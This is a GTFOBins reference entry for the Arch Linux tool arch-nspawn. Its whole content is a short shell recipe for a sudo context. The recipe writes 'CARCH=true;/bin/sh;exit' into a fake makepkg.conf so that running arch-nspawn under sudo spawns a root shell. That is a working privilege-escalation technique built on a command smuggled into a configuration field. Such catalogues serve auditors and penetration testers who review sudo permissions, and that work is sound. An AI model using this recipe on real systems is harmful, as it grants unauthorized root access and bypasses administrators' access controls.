<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/arch-nspawn -->
---
functions:
  shell:
  - code: |-
      mkdir -p ./etc/
      grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
      touch ./etc/pacman.conf
      echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
      arch-nspawn .
    contexts:
      sudo:
...
